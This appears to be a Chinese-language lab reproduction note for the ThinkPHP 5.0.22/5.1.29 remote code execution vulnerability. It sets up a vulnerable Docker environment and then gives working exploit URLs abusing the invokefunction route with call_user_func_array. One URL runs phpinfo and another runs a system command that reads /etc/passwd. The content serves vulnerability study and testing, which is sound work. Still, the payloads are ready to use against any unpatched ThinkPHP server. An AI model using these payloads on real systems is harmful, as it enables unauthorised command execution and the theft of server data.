# ThinkPHP5 5.0.22/5.1.29 远程代码执行漏洞

## 漏洞环境

运行ThinkPHP 5.0.20版本：

```plain
docker compose up -d
```

环境启动后，访问http://your-ip:8080即可看到ThinkPHP默认启动页面。

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780922730861-2f3639af-7268-4e0c-b35d-8f46605d7906.png)

## 漏洞复现

直接访问http://your-ip:8080/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1，即可执行phpinfo：

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780922730928-46526d22-5900-484a-a119-0ca8ab96dfa8.png)

执行系统命令：

```plain
http://your-ip:8080/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cat%20/etc/passwd
```

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780922731139-18d88595-a997-4022-bd33-41bd47f45257.png)